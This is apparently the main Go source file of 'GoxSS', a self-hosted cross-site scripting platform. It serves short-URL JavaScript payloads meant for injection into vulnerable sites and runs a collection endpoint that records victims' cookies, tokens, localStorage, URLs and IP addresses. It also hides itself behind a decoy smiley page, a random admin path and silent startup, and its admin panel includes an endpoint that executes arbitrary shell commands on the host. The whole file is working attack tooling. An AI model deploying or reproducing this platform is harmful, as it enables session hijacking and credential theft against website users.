package main

import (
	"context"
	"crypto/sha256"
	"embed"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"io/fs"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

//go:embed web staticAssets
var assets embed.FS

var (
	basePath string // 后台随机部署路径前缀，形如 "/k3Xf9"
	db       *DB
	auth     = newAuth()
	hub      = newHub()
)

// ══════════════ 回传接收端 ══════════════
// /c 为最短回传端点：GET（img 通道，表单参数）与 POST（fetch 通道，JSON）均支持

func collect(w http.ResponseWriter, r *http.Request) {
	h := Hit{
		ID:           sanitize(r.FormValue("id"), "default", 64),
		IP:           clientIP(r),
		URL:          sanitize(r.FormValue("url"), "", 1024),
		Domain:       sanitize(r.FormValue("domain"), "", 255),
		Title:        sanitize(r.FormValue("title"), "", 255),
		Referrer:     sanitize(r.FormValue("referrer"), "", 1024),
		Cookie:       sanitize(r.FormValue("cookie"), "", 2048),
		Token:        sanitize(r.FormValue("token"), "", 2048),
		LocalStorage: sanitize(r.FormValue("localstorage"), "", 4096),
		UserAgent:    sanitize(r.UserAgent(), "", 512),
		Extra:        sanitize(r.FormValue("extra"), "", 4096),
	}

	if r.Method == http.MethodPost {
		var p Hit
		if err := json.NewDecoder(io.LimitReader(r.Body, 1<<20)).Decode(&p); err == nil {
			if p.ID != "" {
				h.ID = sanitize(p.ID, h.ID, 64)
			}
			if p.URL != "" {
				h.URL = sanitize(p.URL, h.URL, 1024)
			}
			if p.Domain != "" {
				h.Domain = sanitize(p.Domain, h.Domain, 255)
			}
			if p.Title != "" {
				h.Title = sanitize(p.Title, h.Title, 255)
			}
			if p.Referrer != "" {
				h.Referrer = sanitize(p.Referrer, h.Referrer, 1024)
			}
			if p.Cookie != "" {
				h.Cookie = sanitize(p.Cookie, h.Cookie, 2048)
			}
			if p.Token != "" {
				h.Token = sanitize(p.Token, h.Token, 2048)
			}
			if p.LocalStorage != "" {
				h.LocalStorage = sanitize(p.LocalStorage, h.LocalStorage, 4096)
			}
			if p.Extra != "" {
				h.Extra = sanitize(p.Extra, h.Extra, 4096)
			}
		}
	}

	if h.Cookie != "" || h.Token != "" || h.URL != "" || h.Extra != "" {
		h.Channel = map[bool]string{true: "fetch", false: "img"}[r.Method == http.MethodPost]
		saved, err := db.InsertHit(h)
		if err != nil {
			log.Printf("[!] 回显入库失败: %v", err)
		} else {
			h = saved
			log.Printf("[+] 回显成功 id=%s ip=%s url=%s", h.ID, h.IP, h.URL)
			// 实时推送新回显
			hub.broadcast("hit", h)
		}
	}

	// 返回 1x1 透明 GIF，兼容图片通道
	w.Header().Set("Content-Type", "image/gif")
	_, _ = w.Write([]byte{
		0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00,
		0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0x2c,
		0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02,
		0x02, 0x44, 0x01, 0x00, 0x3b,
	})
}

// serveHookJS 动态下发注入脚本：环境引导 + 项目所选 JS 模块
// hook.js 只是模块库中的一个普通模块（id=hook），与其他模块一样由项目选择，
// 不再自动附加到任何 payload；仅当项目勾选了它才会包含基础采集代码
func serveHookJS(w http.ResponseWriter, projectID string) {
	var b strings.Builder
	// 环境引导：项目 ID（供所选模块的回传归属）
	if projectID != "" {
		b.WriteString("window.__goxssId=" + strconv.Quote(projectID) + ";\n")
	}
	if p, _ := db.GetProject(projectID); p != nil {
		// 兼容旧版内联 custom_js
		if strings.TrimSpace(p.CustomJS) != "" {
			b.WriteString(p.CustomJS)
			b.WriteString("\n")
		}
		// 按项目选择的顺序拼接各 JS 模块（每个功能独立一个模块），无标注直接下发
		for _, jid := range p.JSIDs {
			m, err := db.GetJS(jid)
			if err != nil || m == nil || strings.TrimSpace(m.Code) == "" {
				continue
			}
			b.WriteString(m.Code)
			b.WriteString("\n")
		}
	}
	w.Header().Set("Content-Type", "application/javascript; charset=utf-8")
	w.Header().Set("Access-Control-Allow-Origin", "*") // 供跨域注入使用
	_, _ = w.Write([]byte(b.String()))
}

// serveJS 兼容入口：/hook.js?id=<项目ID>
func serveJS(w http.ResponseWriter, r *http.Request) {
	id := sanitize(r.URL.Query().Get("id"), "", 64)
	if p, _ := db.GetProject(id); p == nil {
		id = "" // 未知项目按无引导处理，hook.js 自行回退
	}
	serveHookJS(w, id)
}

// serveShortJS 短码入口：/s/<短码> → 对应项目的注入脚本（URL 极短，便于插入 XSS 点）
func serveShortJS(w http.ResponseWriter, r *http.Request) {
	code := sanitize(r.PathValue("code"), "", 16)
	p, err := db.GetProjectByShort(code)
	if err != nil || p == nil {
		http.Error(w, "// 未知短码: "+code, http.StatusNotFound)
		return
	}
	serveHookJS(w, p.ID)
}

func jsonWrite(w http.ResponseWriter, status int, v any) {
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	w.WriteHeader(status)
	_ = json.NewEncoder(w).Encode(v)
}

// ---- 工具函数 ----

// sanitize 清洗字符串：限制最大长度，去控制字符
func sanitize(s, def string, max int) string {
	s = strings.TrimSpace(s)
	if s == "" {
		return def
	}
	if len(s) > max {
		s = s[:max]
	}
	var b strings.Builder
	for _, r := range s {
		if r >= 0x20 || r == '\t' || r == '\n' || r == '\r' {
			b.WriteRune(r)
		}
	}
	return b.String()
}

// clientIP 提取来源 IP（优先 X-Forwarded-For / X-Real-IP）
func clientIP(r *http.Request) string {
	for _, h := range []string{"X-Forwarded-For", "X-Real-IP"} {
		if v := r.Header.Get(h); v != "" {
			return strings.TrimSpace(strings.Split(v, ",")[0])
		}
	}
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return host
}

// ---- 项目 API ----

func projectsAPI(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		projects, err := db.ListProjects()
		if err != nil {
			jsonWrite(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
			return
		}
		jsonWrite(w, http.StatusOK, map[string]any{"projects": projects})

	case http.MethodPost:
		var req struct {
			Name  string   `json:"name"`
			Desc  string   `json:"desc"`
			JSIDs []string `json:"jsIDs"`
		}
		if err := json.NewDecoder(io.LimitReader(r.Body, 512<<10)).Decode(&req); err != nil {
			jsonWrite(w, http.StatusBadRequest, map[string]string{"error": "请求体不是合法 JSON"})
			return
		}
		name := sanitize(req.Name, "", 64)
		if name == "" {
			jsonWrite(w, http.StatusBadRequest, map[string]string{"error": "项目名称不能为空"})
			return
		}
		p := Project{
			ID:      genProjectID(name),
			Name:    name,
			Desc:    sanitize(req.Desc, "", 255),
			JSIDs:   sanitizeJSIDs(req.JSIDs),
			Created: time.Now().Format("2006-01-02 15:04"),
		}
		// ID 冲突时追加序号
		for i := 2; ; i++ {
			exist, err := db.GetProject(p.ID)
			if err != nil {
				jsonWrite(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
				return
			}
			if exist == nil {
				break
			}
			p.ID = p.ID + "-" + itoa(i)
		}
		if err := db.CreateProject(p); err != nil {
			jsonWrite(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
			return
		}
		code, err := db.AssignShortCode(p.ID)
		if err != nil {
			log.Printf("[!] 分配短码失败 id=%s: %v", p.ID, err)
		} else {
			p.Short = code
		}
		log.Printf("[project] 新建项目 id=%s name=%s", p.ID, p.Name)
		hub.broadcast("projects", nil)
		jsonWrite(w, http.StatusCreated, p)

	default:
		w.Header().Set("Allow", "GET, POST")
		jsonWrite(w, http.StatusMethodNotAllowed, map[string]string{"error": "不支持的方法"})
	}
}

func projectAPI(w http.ResponseWriter, r *http.Request) {
	id := sanitize(r.PathValue("id"), "", 64)

	switch r.Method {
	case http.MethodPut:
		existing, err := db.GetProject(id)
		if err != nil {
			jsonWrite(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
			return
		}
		if existing == nil {
			jsonWrite(w, http.StatusNotFound, map[string]string{"error": "项目不存在"})
			return
		}
		var req struct {
			Name  string   `json:"name"`
			Desc  string   `json:"desc"`
			JSIDs []string `json:"jsIDs"`
		}
		if err := json.NewDecoder(io.LimitReader(r.Body, 512<<10)).Decode(&req); err != nil {
			jsonWrite(w, http.StatusBadRequest, map[string]string{"error": "请求体不是合法 JSON"})
			return
		}
		existing.Name = sanitize(req.Name, existing.Name, 64)
		existing.Desc = sanitize(req.Desc, "", 255)
		existing.JSIDs = sanitizeJSIDs(req.JSIDs)
		if err := db.UpdateProject(*existing); err != nil {
			jsonWrite(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
			return
		}
		hub.broadcast("projects", nil)
		jsonWrite(w, http.StatusOK, existing)

	case http.MethodDelete:
		if err := db.DeleteProject(id); err != nil {
			jsonWrite(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
			return
		}
		hub.broadcast("projects", nil)
		jsonWrite(w, http.StatusOK, map[string]string{"status": "ok"})

	default:
		w.Header().Set("Allow", "PUT, DELETE")
		jsonWrite(w, http.StatusMethodNotAllowed, map[string]string{"error": "不支持的方法"})
	}
}

// sanitizeJSIDs 校验模块 ID 列表（去空白、去重、限制长度与数量）
func sanitizeJSIDs(ids []string) []string {
	var out []string
	seen := map[string]bool{}
	for _, id := range ids {
		id = sanitize(id, "", 64)
		if id == "" || seen[id] {
			continue
		}
		if m, _ := db.GetJS(id); m == nil {
			continue // 不存在的模块忽略
		}
		seen[id] = true
		out = append(out, id)
		if len(out) >= 16 {
			break
		}
	}
	return out
}

// ---- JS 模块 API ----

func jsAPI(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		modules, err := db.ListJS()
		if err != nil {
			jsonWrite(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
			return
		}
		jsonWrite(w, http.StatusOK, map[string]any{"modules": modules})

	case http.MethodPost:
		var req struct {
			ID   string `json:"id"`
			Name string `json:"name"`
			Desc string `json:"desc"`
			Code string `json:"code"`
		}
		if err := json.NewDecoder(io.LimitReader(r.Body, 512<<10)).Decode(&req); err != nil {
			jsonWrite(w, http.StatusBadRequest, map[string]string{"error": "请求体不是合法 JSON"})
			return
		}
		name := sanitize(req.Name, "", 64)
		if name == "" {
			jsonWrite(w, http.StatusBadRequest, map[string]string{"error": "模块名称不能为空"})
			return
		}
		if len(req.Code) > 256<<10 {
			jsonWrite(w, http.StatusBadRequest, map[string]string{"error": "JS 代码过大（上限 256KB）"})
			return
		}
		id := genProjectID(req.ID) // 与项目同规则的 slug 生成
		if id == "" || id == "proj" {
			id = "js"
		}
		m := JSModule{
			ID:      id,
			Name:    name,
			Desc:    sanitize(req.Desc, "", 255),
			Code:    req.Code,
			Created: time.Now().Format("2006-01-02 15:04"),
		}
		// ID 冲突时追加序号
		for i := 2; ; i++ {
			exist, err := db.GetJS(m.ID)
			if err != nil {
				jsonWrite(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
				return
			}
			if exist == nil {
				break
			}
			m.ID = m.ID + "-" + itoa(i)
		}
		if err := db.CreateJS(m); err != nil {
			jsonWrite(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
			return
		}
		log.Printf("[js] 新建模块 id=%s name=%s", m.ID, m.Name)
		hub.broadcast("js", nil)
		jsonWrite(w, http.StatusCreated, m)

	default:
		w.Header().Set("Allow", "GET, POST")
		jsonWrite(w, http.StatusMethodNotAllowed, map[string]string{"error": "不支持的方法"})
	}
}

func jsItemAPI(w http.ResponseWriter, r *http.Request) {
	id := sanitize(r.PathValue("id"), "", 64)

	switch r.Method {
	case http.MethodPut:
		existing, err := db.GetJS(id)
		if err != nil {
			jsonWrite(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
			return
		}
		if existing == nil {
			jsonWrite(w, http.StatusNotFound, map[string]string{"error": "模块不存在"})
			return
		}
		var req struct {
			Name string `json:"name"`
			Desc string `json:"desc"`
			Code string `json:"code"`
		}
		if err := json.NewDecoder(io.LimitReader(r.Body, 512<<10)).Decode(&req); err != nil {
			jsonWrite(w, http.StatusBadRequest, map[string]string{"error": "请求体不是合法 JSON"})
			return
		}
		if len(req.Code) > 256<<10 {
			jsonWrite(w, http.StatusBadRequest, map[string]string{"error": "JS 代码过大（上限 256KB）"})
			return
		}
		existing.Name = sanitize(req.Name, existing.Name, 64)
		existing.Desc = sanitize(req.Desc, "", 255)
		existing.Code = req.Code
		if err := db.UpdateJS(*existing); err != nil {
			jsonWrite(w, http.StatusForbidden, map[string]string{"error": err.Error()})
			return
		}
		log.Printf("[js] 更新模块 id=%s", id)
		hub.broadcast("js", nil)
		jsonWrite(w, http.StatusOK, existing)

	case http.MethodDelete:
		if err := db.DeleteJS(id); err != nil {
			if strings.Contains(err.Error(), "系统模块") {
				jsonWrite(w, http.StatusForbidden, map[string]string{"error": err.Error()})
			} else {
				jsonWrite(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
			}
			return
		}
		log.Printf("[js] 删除模块 id=%s", id)
		hub.broadcast("js", nil)
		jsonWrite(w, http.StatusOK, map[string]string{"status": "ok"})

	default:
		w.Header().Set("Allow", "PUT, DELETE")
		jsonWrite(w, http.StatusMethodNotAllowed, map[string]string{"error": "不支持的方法"})
	}
}

// ══════════════ main ══════════════

var (
	flagPort   = flag.String("port", "", "监听端口（默认 8080，也可用 PORT 环境变量）")
	flagDB     = flag.String("db", "", "SQLite 数据库文件路径（默认存到用户数据目录，单 exe 即可运行）")
	flagStderr = flag.Bool("v", false, "显示运行日志（默认静默启动，不输出日志）")
	flagMount = flag.String("mount", "", "功能路径挂载前缀（如 -mount /gx），所有公开端点收拢到该前缀下，避免与同域名其他站点冲突")
	flagEntry = flag.String("entry", "", "自定义后台入口路径（如 -entry mykey → 通过 http://host/mykey 签发入口令牌进入后台；默认 /h）")
)

// fatal 启动期致命错误：无论静默与否都直接打印到 stderr 并退出
func fatal(format string, args ...any) {
	fmt.Fprintf(os.Stderr, "[goxss] "+format+"\n", args...)
	os.Exit(1)
}

// resolveDBPath 解析数据库路径：
//  1. -db 参数 / DB_PATH 环境变量优先
//  2. 当前目录已存在 goxss.db 则沿用（兼容旧部署）
//  3. 否则使用用户数据目录下的随机 ID 子目录（由本机信息哈希派生，跨重启稳定，
//     但不含任何项目名痕迹）：Windows: %AppData%\<16位随机ID>\<随机ID>.db
func resolveDBPath() string {
	if p := *flagDB; p != "" {
		return p
	}
	if p := os.Getenv("DB_PATH"); p != "" {
		return p
	}
	if _, err := os.Stat("goxss.db"); err == nil {
		return "goxss.db" // 旧部署兼容
	}
	dir, err := os.UserConfigDir()
	if err != nil || dir == "" {
		dir = os.TempDir()
	}
	id := machineID()
	dbPath := filepath.Join(dir, id, id+".db")
	// 迁移旧版默认目录（%AppData%\goxss\goxss.db）到随机 ID 目录
	oldPath := filepath.Join(dir, "goxss", "goxss.db")
	if _, err := os.Stat(dbPath); os.IsNotExist(err) {
		if _, err := os.Stat(oldPath); err == nil {
			if err := os.MkdirAll(filepath.Dir(dbPath), 0o755); err == nil {
				if err := os.Rename(oldPath, dbPath); err == nil {
					_ = os.Remove(filepath.Join(dir, "goxss"))
				}
			}
		}
	}
	if err := os.MkdirAll(filepath.Dir(dbPath), 0o755); err != nil {
		fatal("创建数据目录失败 %s: %v（可用 -db 手动指定数据库路径）", filepath.Dir(dbPath), err)
	}
	return dbPath
}

// machineID 由本机信息（主机名+用户目录）派生 16 位随机外观的稳定 ID，
// 同一台机器上每次启动结果一致（数据不丢），不同机器各不相同
func machineID() string {
	host, _ := os.Hostname()
	home, _ := os.UserHomeDir()
	h := sha256.Sum256([]byte("goxss\x00" + host + "\x00" + home))
	return hex.EncodeToString(h[:8])
}

func main() {
	flag.Parse()
	// 默认静默启动：所有运行日志（含启动横幅）不输出；-v 开启
	if !*flagStderr {
		log.SetOutput(io.Discard)
	}
	var err error
	dbPath := resolveDBPath()
	db, err = openDB(dbPath)
	if err != nil {
		abs, _ := filepath.Abs(dbPath)
		wd, _ := os.Getwd()
		fatal("打开数据库失败: %v\n  数据库路径: %s\n  当前工作目录: %s\n  提示: 14 错误通常是目录无写入权限或路径不存在；可用 -db 指定可写路径（如 -db D:\\goxss\\goxss.db）",
			err, abs, wd)
	}
	defer db.Close()
	db.EnsureDemoProject()
	if err := db.EnsureAdminUser(); err != nil {
		fatal("初始化管理账号失败: %v", err)
	}
	if err := db.EnsureProjectShorts(); err != nil {
		fatal("初始化项目短码失败: %v", err)
	}
	if err := db.EnsureDefaultModules(); err != nil {
		fatal("初始化内置 JS 模块失败: %v", err)
	}
	if err := db.EnsureLegacyCustomJS(); err != nil {
		fatal("迁移旧项目自定义 JS 失败: %v", err)
	}
	// hook.js 作为普通独立模块入库（与其他模块平级，由项目选择）
	hookCode, err := fs.ReadFile(assets, "staticAssets/hook.js")
	if err != nil {
		fatal("读取 hook.js 失败: %v", err)
	}
	if err := db.EnsureHookModule(string(hookCode)); err != nil {
		fatal("初始化 hook.js 模块失败: %v", err)
	}

	sub, err := fs.Sub(assets, "web")
	if err != nil {
		fatal("初始化面板资源失败: %v", err)
	}

	port := *flagPort
	if port == "" {
		port = os.Getenv("PORT")
	}
	if port == "" {
		port = "8080"
	}
	// 校验端口为纯数字
	if n, err := strconv.Atoi(port); err != nil || n < 1 || n > 65535 {
		fatal("端口无效: %s（应为 1-65535）", port)
	}
	addr := ":" + port

	// 部署随机路径：首次生成并入库，之后固定。形如 "/k3Xf9"
	baseCode, err := db.EnsureBasePath()
	if err != nil {
		fatal("生成本次部署路径失败: %v", err)
	}
	base := "/" + baseCode
	// 挂载前缀：所有公开端点（/h /s/ /c /hook.js /demo）与后台随机路径都收拢到它下面，
	// 例如 -mount /gx 后入口为 /gx/h、payload 为 /gx/s/<短码>；为空则保持根路径原样
	mount := strings.Trim(*flagMount, "/")
	if mount != "" {
		mount = "/" + mount
		base = mount + "/" + baseCode
	}
	basePath = base

	mux := http.NewServeMux()

	// ── 根路径：纯静态笑脸伪装页（无需登录，无任何平台痕迹）──
	mux.HandleFunc("GET /{$}", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		_, _ = w.Write([]byte(smileyPage))
	})

	// ── 后台入口：签发入口令牌 → 跳转随机路径登录页（仅部署者知晓）──
	// 入口路径可通过 -entry 自定义（如 -entry mykey → /mykey），默认 /h
	entryPath := strings.Trim(*flagEntry, "/")
	if entryPath == "" {
		entryPath = "h"
	}
	mux.HandleFunc("GET "+mount+"/"+entryPath, func(w http.ResponseWriter, r *http.Request) {
		tok := IssueEntryToken()
		http.Redirect(w, r, basePath+"/login?e="+tok, http.StatusTemporaryRedirect)
	})

	// ── 公开短链端点（保持根路径最短）──
	mux.Handle("GET "+mount+"/s/{code}", http.HandlerFunc(serveShortJS)) // 短码 payload
	mux.HandleFunc(mount+"/c", collect)                                 // 回传接收端（最短形式）
	mux.Handle("GET "+mount+"/hook.js", http.HandlerFunc(serveJS))      // 兼容旧形式
	mux.HandleFunc("GET "+mount+"/demo", func(w http.ResponseWriter, r *http.Request) {
		code := "demo"
		if p, _ := db.GetProject("demo"); p != nil && p.Short != "" {
			code = p.Short
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		page := strings.ReplaceAll(demoPage, "{{SHORT}}", code)
		page = strings.ReplaceAll(page, "{{MOUNT}}", mount)
		page = strings.ReplaceAll(page, "{{BASE}}", basePath)
		_, _ = w.Write([]byte(page))
	})

	// ── 后台（随机路径下，需要入口令牌或登录会话，否则跳回首页）──
	// 静态资源加 no-cache：更新 exe 后浏览器刷新即取新版，不用清缓存
	staticHandler := http.StripPrefix(base+"/static/", noCacheFS(http.FileServerFS(sub)))
	mux.Handle("GET "+base+"/static/", auth.requireEntry(staticHandler))
	mux.Handle("GET "+base+"/login", auth.requireEntry(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// 已登录则直接进面板
		if auth.Valid(tokenFrom(r)) {
			http.Redirect(w, r, base+"/", http.StatusSeeOther)
			return
		}
		page, err := fs.ReadFile(assets, "web/login.html")
		if err != nil {
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}
		// 注入部署路径与入口令牌（令牌跟随静态资源与登录请求）
		out := strings.ReplaceAll(string(page), "{{BASE}}", base)
		out = strings.ReplaceAll(out, "{{ENTRY}}", entryTokenFrom(r))
		// 静态资源附加入口令牌：?e=xxx（无令牌则留空）
		if e := entryTokenFrom(r); e != "" {
			out = strings.ReplaceAll(out, "{{E}}", "?e="+e)
		} else {
			out = strings.ReplaceAll(out, "{{E}}", "")
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		_, _ = w.Write([]byte(out))
	})))
	mux.Handle("POST "+base+"/api/login", auth.requireEntry(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var req struct {
			User string `json:"user"`
			Pass string `json:"pass"`
		}
		if err := json.NewDecoder(io.LimitReader(r.Body, 4<<10)).Decode(&req); err != nil {
			jsonWrite(w, http.StatusBadRequest, map[string]string{"error": "请求体不是合法 JSON"})
			return
		}
		token, ok := auth.Login(sanitize(req.User, "", 64), req.Pass)
		if !ok {
			log.Printf("[auth] 登录失败 user=%s ip=%s", req.User, clientIP(r))
			jsonWrite(w, http.StatusUnauthorized, map[string]string{"error": "用户名或密码错误"})
			return
		}
		log.Printf("[auth] 登录成功 user=%s ip=%s", req.User, clientIP(r))
		http.SetCookie(w, &http.Cookie{
			Name:     sessionCookie,
			Value:    token,
			Path:     "/",
			HttpOnly: true,
			SameSite: http.SameSiteLaxMode,
			MaxAge:   int(sessionTTL / time.Second),
		})
		jsonWrite(w, http.StatusOK, map[string]string{"status": "ok"})
	})))
	mux.Handle("POST "+base+"/api/logout", auth.requireEntry(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		auth.Logout(tokenFrom(r))
		http.SetCookie(w, &http.Cookie{Name: sessionCookie, Value: "", Path: "/", MaxAge: -1})
		jsonWrite(w, http.StatusOK, map[string]string{"status": "ok"})
	})))

	// ── 受保护端点（面板 / API / WS），挂载在 base 下 ──
	protected := http.NewServeMux()

	// 修改密码：校验旧密码 + 新密码最短 6 位，成功后吊销所有会话
	protected.HandleFunc("POST /api/password", func(w http.ResponseWriter, r *http.Request) {
		user := "admin"
		var req struct {
			Old     string `json:"old"`
			New     string `json:"new"`
			Confirm string `json:"confirm"`
		}
		if err := json.NewDecoder(io.LimitReader(r.Body, 4<<10)).Decode(&req); err != nil {
			jsonWrite(w, http.StatusBadRequest, map[string]string{"error": "请求体不是合法 JSON"})
			return
		}
		if len(req.New) < 6 {
			jsonWrite(w, http.StatusBadRequest, map[string]string{"error": "新密码至少 6 位"})
			return
		}
		if req.New != req.Confirm {
			jsonWrite(w, http.StatusBadRequest, map[string]string{"error": "两次输入的新密码不一致"})
			return
		}
		if !auth.ChangePassword(user, req.Old, req.New) {
			jsonWrite(w, http.StatusUnauthorized, map[string]string{"error": "旧密码错误"})
			return
		}
		// 会话已吊销，让前端清除 Cookie 并跳登录页
		http.SetCookie(w, &http.Cookie{Name: sessionCookie, Value: "", Path: "/", MaxAge: -1})
		jsonWrite(w, http.StatusOK, map[string]string{"status": "ok"})
	})

	// 面板首页
	protected.HandleFunc("GET /{$}", func(w http.ResponseWriter, r *http.Request) {
		page, err := fs.ReadFile(assets, "web/index.html")
		if err != nil {
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}
		out := strings.ReplaceAll(string(page), "{{BASE}}", base)
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		_, _ = w.Write([]byte(out))
	})

	// WebSocket 实时推送（升级前校验会话）
	protected.HandleFunc("GET /ws", func(w http.ResponseWriter, r *http.Request) {
		if !auth.Valid(tokenFrom(r)) {
			jsonWrite(w, http.StatusUnauthorized, map[string]string{"error": "未登录或会话已过期"})
			return
		}
		hub.serveWS(w, r)
	})

	// API
	protected.HandleFunc("GET /api/hits", func(w http.ResponseWriter, r *http.Request) {
		hits, err := db.ListHits(200)
		if err != nil {
			jsonWrite(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
			return
		}
		jsonWrite(w, http.StatusOK, map[string]any{"count": len(hits), "hits": hits})
	})
	protected.HandleFunc("POST /api/clear", func(w http.ResponseWriter, r *http.Request) {
		if err := db.ClearHits(); err != nil {
			jsonWrite(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
			return
		}
		hub.broadcast("hits", nil)
		jsonWrite(w, http.StatusOK, map[string]string{"status": "ok"})
	})
	protected.HandleFunc("/api/projects", projectsAPI)
	protected.HandleFunc("/api/projects/{id}", projectAPI)
	protected.HandleFunc("/api/js", jsAPI)
	protected.HandleFunc("/api/js/{id}", jsItemAPI)

	// ── 管理终端：仅面板已登录会话可用，等同服务运行账户权限执行命令 ──
	protected.HandleFunc("POST /api/exec", func(w http.ResponseWriter, r *http.Request) {
		var req struct {
			Cmd string `json:"cmd"`
		}
		if err := json.NewDecoder(io.LimitReader(r.Body, 64<<10)).Decode(&req); err != nil {
			jsonWrite(w, http.StatusBadRequest, map[string]string{"error": "请求体不是合法 JSON"})
			return
		}
		cmdStr := sanitize(req.Cmd, "", 4096)
		if cmdStr == "" {
			jsonWrite(w, http.StatusBadRequest, map[string]string{"error": "命令为空"})
			return
		}
		ctx, cancel := context.WithTimeout(r.Context(), 60*time.Second)
		defer cancel()
		var c *exec.Cmd
		if runtime.GOOS == "windows" {
			// chcp 65001 让 cmd 输出 UTF-8，避免中文乱码
			c = exec.CommandContext(ctx, "cmd", "/c", "chcp 65001>nul & "+cmdStr)
		} else {
			c = exec.CommandContext(ctx, "sh", "-c", cmdStr)
		}
		out, err := c.CombinedOutput()
		if len(out) > 128<<10 {
			out = out[:128<<10]
		}
		log.Printf("[exec] cmd=%q ip=%s err=%v", cmdStr, clientIP(r), err)
		jsonWrite(w, http.StatusOK, map[string]string{"out": string(out)})
	})

	// 受保护路由统一套上鉴权中间件，剥离 base 前缀后分发
	// StripPrefix 在外层：requireAuth 看到的是剥离后的真实路径（如 /api/exec），
	// 这样 isAPIPath 才能正确识别 API 请求并返回 401 而不是重定向
	mux.Handle(base+"/", http.StripPrefix(base, auth.requireAuth(protected)))

	origin := "http://localhost" + addr
	if *flagStderr {
		log.Printf("GoxSS XSS 平台已启动（后台随机路径 %s）", base)
		log.Printf("挂载前缀: %s（-mount 可更改）", mount)
		log.Printf("后台入口: %s/h  →  %s%s/", origin, origin, mount)
		log.Printf("登录页: %s%s/login", origin, base)
		log.Printf("数据库: %s (SQLite WAL)", dbPath)
		log.Printf("Payload 示例: <script src=\"%s/s/<项目短码>\"></script>", origin)
	}

	server := &http.Server{
		Addr:              addr,
		Handler:           logRequest(mux),
		ReadHeaderTimeout: 5 * time.Second,
	}
	if err := server.ListenAndServe(); err != nil {
		// 监听失败必须可见（即使静默模式）
		log.SetOutput(os.Stderr)
		fatal("服务启动失败: %v", err)
	}
}

// noCacheFS 给静态文件响应加 no-cache 头：浏览器每次回源校验，更新后刷新即生效
func noCacheFS(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Cache-Control", "no-cache, must-revalidate")
		next.ServeHTTP(w, r)
	})
}

// smileyPage 根路径伪装页：纯静态笑脸，无任何平台痕迹
const smileyPage = `<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>:)</title>
<style>
  html,body{height:100%;margin:0;display:grid;place-items:center;background:#fdf6e3}
  .face{width:220px;height:220px;border-radius:50%;background:#fbbf24;position:relative;
        box-shadow:0 10px 40px rgba(0,0,0,.15);animation:bob 3s ease-in-out infinite}
  .eye{position:absolute;top:70px;width:26px;height:36px;border-radius:50%;background:#3f2d10}
  .eye.l{left:60px}.eye.r{right:60px}
  .mouth{position:absolute;bottom:48px;left:50%;transform:translateX(-50%);width:110px;height:55px;
         border-bottom:12px solid #3f2d10;border-radius:0 0 110px 110px}
  @keyframes bob{0%,100%{transform:translateY(0)}50%{transform:translateY(-12px)}}
</style></head>
<body><div class="face"><div class="eye l"></div><div class="eye r"></div><div class="mouth"></div></div></body>
</html>`

const demoPage = `<!DOCTYPE html>
<html lang="zh-CN"><head><meta charset="utf-8"><title>模拟受害页面</title></head>
<body style="font-family:sans-serif;background:#111;color:#eee;padding:40px">
<h2>⚠️ 模拟受害页面（演示用）</h2>
<p>假设这是存在存储型 XSS 漏洞的业务页面，注入的恶意脚本如下：</p>
<pre style="background:#000;padding:12px">&lt;script src="/s/{{SHORT}}"&gt;&lt;/script&gt;</pre>
<p>3 秒后自动触发脚本回传 Cookie / Token / URL ...</p>
<script>
document.cookie = "session=demo-session-abc123; path=/";
localStorage.setItem("token", "eyJhbGciOiJIUzI1NiJ9.demo.jwt.token");
</script>
<script>
setTimeout(function(){
  var s=document.createElement("script");
  s.src="{{MOUNT}}/s/{{SHORT}}";
  document.body.appendChild(s);
},3000);
</script>
</body></html>`

// logRequest 简单请求日志
func logRequest(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		start := time.Now()
		next.ServeHTTP(w, r)
		log.Printf("%s %s %s", r.Method, r.URL.Path, time.Since(start))
	})
}
